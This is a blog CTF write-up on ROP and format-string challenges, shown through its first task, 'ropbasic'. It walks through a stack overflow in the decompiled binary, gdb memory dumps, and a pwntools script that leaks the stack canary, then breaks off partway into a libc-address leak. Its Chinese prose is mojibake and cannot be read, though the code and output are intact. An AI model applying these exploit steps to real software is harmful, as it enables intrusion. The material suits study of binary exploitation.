<!doctype html><html lang=zh-CN dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="ä¸€äº›å­¦åˆ°çš„ ROP ä¸ FSB çš„é¢˜ç›®æ€»ç»“"><title>Pwn01 ROP and FSB</title>
<link rel=canonical href=https://nepl1t.github.io/p/pwn01-rop-and-fsb/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="Pwn01 ROP and FSB"><meta property='og:description' content="ä¸€äº›å­¦åˆ°çš„ ROP ä¸ FSB çš„é¢˜ç›®æ€»ç»“"><meta property='og:url' content='https://nepl1t.github.io/p/pwn01-rop-and-fsb/'><meta property='og:site_name' content='ç¯ç›çš„ç¼çº«å·¥å‚'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Stack Overflow'><meta property='article:tag' content='FSB'><meta property='article:published_time' content='2024-07-21T01:09:28+08:00'><meta property='article:modified_time' content='2024-07-21T01:09:28+08:00'><meta name=twitter:title content="Pwn01 ROP and FSB"><meta name=twitter:description content="ä¸€äº›å­¦åˆ°çš„ ROP ä¸ FSB çš„é¢˜ç›®æ€»ç»“"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=åˆ‡æ¢èœå•>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=1369938134&amp;s=5" width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a><span class=emoji>ğŸ¥</span></figure><div class=site-meta><h1 class=site-name><a href=/>ç¯ç›çš„ç¼çº«å·¥å‚</a></h1><h2 class=site-description>äººäººéƒ½ä¼šæ•¬ç•å°„æ‰‹ï¼Œå¯ç›´é¢æªè†›æ–¹å¾—æ°¸ç”Ÿ</h2></div></header><ol class=menu-social><li><a href=https://space.bilibili.com/3546607700150839 target=_blank title=Bilibili rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 014-4h10a4 4 0 014 4v6a4 4 0 01-4 4H7a4 4 0 01-4-4v-6z"/><path d="M8 3l2 3"/><path d="M16 3l-2 3"/><path d="M9 13v-2"/><path d="M15 11v2"/></svg></a></li><li><a href=https://github.com/nepl1t target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://steamcommunity.com/id/_DYanLiAst/ target=_blank title=Steam rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-steam"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M16.5 5a4.5 4.5.0 11-.653 8.953L11.5 16.962V17a3 3 0 01-2.824 3H8.5a3 3 0 01-2.94-2.402L3 16.5V13l3.51 1.755a2.989 2.989.0 012.834-.635l2.727-3.818A4.5 4.5.0 0116.5 5z"/><circle cx="16.5" cy="9.5" r="1" fill="currentcolor"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>æš—è‰²æ¨¡å¼</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">ç›®å½•</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#task1-ropbasic>Task1 ropbasic</a><ol><li><a href=#preparation>Preparation</a></li><li><a href=#leaking-canary>Leaking Canary</a></li><li><a href=#leaking-libc-addr>Leaking libc addr</a></li><li><a href=#getting-system-shell>Getting system shell</a></li><li><a href=#approach-2-orw>Approach 2 ORW</a></li></ol></li><li><a href=#task2-onerop>Task2 onerop</a><ol><li><a href=#preparation--leaking-libc-addr>Preparation & Leaking libc addr</a></li><li><a href=#getting-system-shell-1>Getting system shell</a></li></ol></li><li><a href=#task3-onefsb>Task3 onefsb</a><ol><li><a href=#preparation-1>Preparation</a></li><li><a href=#getting-offsets>Getting offsets</a></li><li><a href=#hijacking-control-flow>Hijacking control flow</a></li><li><a href=#leaking-libc-address>Leaking libc address</a></li><li><a href=#getting-system-shell-2>Getting system shell</a></li></ol></li><li><a href=#task4-fsb-stack>Task4 fsb-stack</a><ol><li><a href=#preparation-2>Preparation</a></li><li><a href=#leaking-libc-address-1>Leaking libc address</a></li><li><a href=#leaking-stack-address>Leaking stack address</a></li><li><a href=#hijacking-printf-return-addr--getting-system-shell>Hijacking printf() return addr & getting system shell</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/>å­¦ä¹ ç¬”è®°
</a><a href=/categories/cs/>CS
</a><a href=/categories/ctf/>CTF</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/pwn01-rop-and-fsb/>Pwn01 ROP and FSB</a></h2><h3 class=article-subtitle>ä¸€äº›å­¦åˆ°çš„ ROP ä¸ FSB çš„é¢˜ç›®æ€»ç»“</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jul 21, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>é˜…è¯»æ—¶é•¿: 11 åˆ†é’Ÿ</time></div></footer></div></header><section class=article-content><blockquote><p><strong>Attention!</strong></p><p>è¯¥ç•Œé¢å†…æåˆ°çš„ä»»ä½•ä»£ç ä¸åŸç¨‹åºéƒ½å¯åœ¨ <a class=link href=https://github.com/nepl1t/nepl1t.github.io/tree/master/assets target=_blank rel=noopener>https://github.com/nepl1t/nepl1t.github.io/tree/master/assets</a> å†…æ‰¾åˆ°</p></blockquote><h2 id=task1-ropbasic>Task1 ropbasic</h2><h3 id=preparation>Preparation</h3><p>é¦–å…ˆ <code>checksec</code> ä¸€ä¸‹ç¨‹åºï¼Œä¿æŠ¤å…¨å¼€ã€‚ ROPgadget åªèƒ½æ‰¾åˆ°ä¸€ä¸ª gadgetï¼š</p><pre><font color=#5FD700>â¯</font> <font color=#26A269>ROPgadget</font> --binary <u style=text-decoration-style:solid>./ropbasic</u> --only <font color=#A2734C>&quot;pop|ret&quot;</font>
Gadgets information
============================================================
0x00000000000011d3 : pop rbp ; ret
0x000000000000101a : ret
Unique gadgets found: 2
</pre><p>å—¯ï¼Œè‡³å°‘æ‰¾åˆ°ä¸€ä¸ª rbp_ret_addr æ˜¯ <code>0x00000000000011d3 </code>äº†ã€‚</p><p>åç¼–è¯‘ä¸€ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-114h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>264</span><span class=p>];</span> <span class=c1>// [rsp+10h] [rbp-110h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [rsp+118h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>initbuf</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>3</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x100uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;input&gt; &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=mh>0x1000uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>main()</code> çš„é€»è¾‘ååˆ†ç®€å•ï¼Œæ¯æ¬¡å°† <code>s</code> å¼€å§‹çš„è¿ç»­ <code>0x100</code> ä¸ªå†…å­˜æ¸…é›¶ï¼Œç„¶åè¾“å‡ºï¼Œ<code>read()</code> 0x1000ä¸ªå­—èŠ‚ã€‚è‚¯å®šæœ‰æ ˆæº¢å‡ºã€‚</p><p><code>s</code> ç›¸å¯¹ rbp çš„åç§»åœ°å€ä¸º <code>0x110</code>ï¼Œè€ƒè™‘åˆ°ç¨‹åºå¼€äº† Canaryï¼Œå› æ­¤å½“åŠ¡ä¹‹æ€¥å°±æ˜¯å°†å…¶æ³„æ¼å‡ºæ¥ï¼Œå¦åˆ™æ ˆæº¢å‡ºæ³„æ¼ libc å°±æ— ä»è¯´èµ·ã€‚</p><h3 id=leaking-canary>Leaking Canary</h3><p>æ ¹æ®ä»£ç çŸ¥é“ï¼Œä½¿ç”¨ gdb åœåˆ° call memset æ—¶ï¼š</p><pre>
0x555555555264    <font color=#AFD700>lea</font><font color=#FFFFFF>    </font><font color=#5FD7FF>rax</font><font color=#FFFFFF>, [</font><font color=#5FD7FF>rbp</font><font color=#FFFFFF> - </font><font color=#AF87FF>0x110</font><font color=#FFFFFF>]</font>             <font color=#C01C28><b>RAX</b></font> =&gt; <font color=#A2734C>0x7fffffffd9f0</font> â—‚â€” 0
0x55555555526b    <font color=#AFD700>mov</font><font color=#FFFFFF>    </font><font color=#5FD7FF>edx</font><font color=#FFFFFF>, </font><font color=#AF87FF>0x100</font>                     <font color=#C01C28><b>EDX</b></font> =&gt; 0x100
0x555555555270    <font color=#AFD700>mov</font><font color=#FFFFFF>    </font><font color=#5FD7FF>esi</font><font color=#FFFFFF>, </font><font color=#AF87FF>0</font>                         <b>ESI</b> =&gt; 0
0x555555555275    <font color=#AFD700>mov</font><font color=#FFFFFF>    </font><font color=#5FD7FF>rdi</font><font color=#FFFFFF>, </font><font color=#5FD7FF>rax</font>                       <font color=#C01C28><b>RDI</b></font> =&gt; <font color=#A2734C>0x7fffffffd9f0</font> â—‚â€” 0
â–º<font color=#26A269><b>0x555555555278</b></font>    <font color=#AFD700><b>call</b></font><font color=#FFFFFF>   </font><font color=#C01C28>memset@plt</font>                  &lt;<font color=#C01C28>memset@plt</font>&gt;
        <b>s</b>: <font color=#A2734C>0x7fffffffd9f0</font> â—‚â€” 0
        <b>c</b>: 0
        <b>n</b>: 0x100
</pre><p>ç„¶åæŸ¥è¯¢ rdi ä¸ rsp çš„å€¼ï¼š</p><pre><font color=#C01C28>*</font><font color=#C01C28><b>RDI </b></font> <font color=#A2734C>0x7fffffffd9f0</font> â—‚â€” 0
<b>RSP </b> <font color=#A2734C>0x7fffffffd9e0</font> â—‚â€” 0
</pre><p>é‚£ä¹ˆï¼Œ ä» rdi ï¼ˆ0x7fffffffd9f0ï¼‰å¼€å§‹ä¾æ¬¡è¯»å–å†…å­˜æ•°æ®åˆ° rsp ï¼ˆ0x7fffffffdb00ï¼‰çš„ä½ç½®ï¼š</p><pre><font color=#C01C28><b>pwndbg&gt; </b></font>x /40gx 0x7fffffffd9f0
<font color=#12488B>0x7fffffffd9f0</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffda00</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffda10</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffda20</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffda30</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffda40</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffda50</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffda60</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffda70</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffda80</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffda90</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdaa0</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdab0</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdac0</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdad0</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdae0</font>:	0x0000000000000000	0x0000000000000000
<font color=#12488B>0x7fffffffdaf0</font>:	0x0000000000000000	0xe719bae42bbeac00
<font color=#12488B>0x7fffffffdb00</font>:	0x0000000000000001	0x00007ffff7c29d90
<font color=#12488B>0x7fffffffdb10</font>:	0x0000000000000000	0x0000555555555230
<font color=#12488B>0x7fffffffdb20</font>:	0x0000000100000000	0x00007fffffffdc18
<font color=#C01C28><b>pwndbg&gt; </b></font></pre><p>è€ƒè™‘åˆ° <code>memset()</code> å‡½æ•°åœ¨è¿™é‡Œåªæ¸…ç©ºäº† 0x100 çš„æ•°æ® ï¼ˆä¸€ç›´åˆ° <code>0x7fffffffdaf0: 0x0000000000000000</code> ï¼‰ ï¼Œè€Œ <code>0x7fffffffdaf8: 0xe719bae42bbeac00</code> ï¼Œè¿™æ˜¯ä¸€ä¸ª 0x00 ä½œç»“å°¾çš„æ•°æ®ï¼Œå¯ä»¥æ¨æµ‹è¿™å°±æ˜¯ Canaryï¼Œå…³äº <code>s</code> çš„åç§»å€¼ä¸º 0x108ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x7</span><span class=p>)</span> <span class=c1>#0x7 bytes: b&#39;input&gt; &#39;</span>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>offset</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x8</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x42</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x9</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Canary:&#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>Canary</span><span class=p>))</span> 
</span></span></code></pre></td></tr></table></div></div><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><pre>[<font color=#C01C28><b>DEBUG</b></font>] Received 0x7 bytes:
    b&apos;input&gt; &apos;
[<font color=#C01C28><b>DEBUG</b></font>] Sent 0x109 bytes:
    b&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB&apos;
[<font color=#C01C28><b>DEBUG</b></font>] Received 0x119 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  â”‚AAAA<font color=#12488B>â”‚</font>AAAA<font color=#12488B>â”‚</font>AAAA<font color=#12488B>â”‚</font>AAAAâ”‚
    *
    00000100  41 41 41 41  41 41 41 41  42 <font color=#12488B>9f</font> 7e 4b  <font color=#12488B>15</font> <font color=#12488B>b6</font> 3e <font color=#12488B>f9</font>  â”‚AAAA<font color=#12488B>â”‚</font>AAAA<font color=#12488B>â”‚</font>B<font color=#12488B>Â·</font>~K<font color=#12488B>â”‚Â·Â·</font>&gt;<font color=#12488B>Â·</font>â”‚
    00000110  <font color=#12488B>01</font> <font color=#C01C28>0a</font> 69 6e  70 75 74 3e  20                        â”‚<font color=#12488B>Â·</font><font color=#C01C28>Â·</font>in<font color=#12488B>â”‚</font>put&gt;<font color=#12488B>â”‚</font> â”‚
    00000119
[<font color=#12488B><b>*</b></font>] Canary:0xf93eb6154b7e9f00
</pre><p>å¾—åˆ° Canary ä¸º <code>0xf93eb6154b7e9f00</code></p><p>ç¨‹åºæ²¡æœ‰æ£€æµ‹åˆ°æ ˆæº¢å‡ºï¼Œè€Œæ˜¯æ­£å¸¸é€€å‡ºï¼Œè¿™è¯´æ˜ Canary æˆåŠŸæ³„æ¼å¹¶ç»•è¿‡äº†ã€‚</p><h3 id=leaking-libc-addr>Leaking libc addr</h3><p>ç”±äºå¼€äº† PIEï¼Œæ¯æ¬¡è¿è¡Œçš„åŸºå€éƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æ¯æ¬¡æ ˆæº¢å‡º ROP ä¹‹å‰ï¼Œéƒ½éœ€è¦å¾—åˆ° libc çš„åœ°å€ã€‚é€šè¿‡ <code>objdump -d</code> å¯ä»¥å‘ç°ç¨‹åºé‡Œç¡®å®æ˜¯æœ‰ <code>libc_start_main()</code> çš„ç¬¦å·ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å®ƒçš„åœ°å€ï¼Œå†å‡å»å…¶åœ¨ libc ä¸­çš„åç§»åœ°å€ï¼Œä»è€Œå¾—åˆ° libc åœ°å€ã€‚</p><p>é¦–å…ˆï¼ŒåŠ¨æ€è°ƒè¯•æ—¶ï¼ˆæ­¤æ—¶æ­£åœ¨ <code>read()</code> å‡½æ•°å†…ï¼‰çœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><pre><font color=#12488B>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</font>
 â–º 0   0x55555555526b
   1   0x7ffff7c29d90
   2   0x7ffff7c29e40 __libc_start_main+128
   3   0x555555555125
</pre><p>å› æ­¤å¯ä»¥åˆ¤å®šï¼Œ <code>0x55555555526b</code> ï¼ˆä½œä¸º <code>read()</code> å‡½æ•°çš„è¿”å›åœ°å€ï¼‰ä½äº <code>main()</code> å†…ï¼Œå› æ­¤ <code>0x7ffff7c29d90</code> å°±æ˜¯ <code>main()</code> å‡½æ•°æ‰§è¡Œå®Œåçš„è¿”å›åœ°å€ã€‚</p><p>æ³¨æ„åˆ° <code>0x7ffff7c29e40</code> ï¼ˆ ç›¸å¯¹ <code>0x7ffff7c29d90</code> æ˜¯ <code>0xb0</code>ï¼‰ç›¸å¯¹äº <code>__libc_start_main()</code> çš„åç§»å€¼æ˜¯ <code>0x80</code> (128) ï¼Œå› æ­¤å¯ä»¥å¾—åˆ° <code>main()</code> çš„è¿”å›åœ°å€ç›¸å¯¹äº <code>__libc_start_main()</code> çš„åç§»å€¼æ˜¯ <code>0x30</code> ã€‚é€šè¿‡å‰é¢æ ˆæº¢å‡ºå¾—åˆ° <code>main()</code> çš„è¿”å›åœ°å€åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°<code>__libc_start_main()</code> çš„å®é™…åœ°å€ã€‚</p><p>é€šè¿‡å¦‚ä¸‹çš„ python è„šæœ¬ï¼Œå¯ä»¥å¾—åˆ° libc çš„åœ°å€ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Leaking libc address</span>
</span></span><span class=line><span class=cl><span class=n>__libc_start_main_offset</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># pause()</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>offset</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;AABBCCDDEEFFGGHH&#39;</span><span class=p>)</span> <span class=c1>#0x108 + 0x8 + 0x8 = 0x118</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x118</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>received</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span> <span class=c1>#åé¢ä¸€ä¸ª &#39;\ninput&gt; &#39; (printfçš„å†…å®¹)</span>
</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x7</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>received</span> <span class=o>=</span> <span class=n>received</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>received</span> <span class=o>=</span> <span class=n>received</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>received</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># pause()</span>
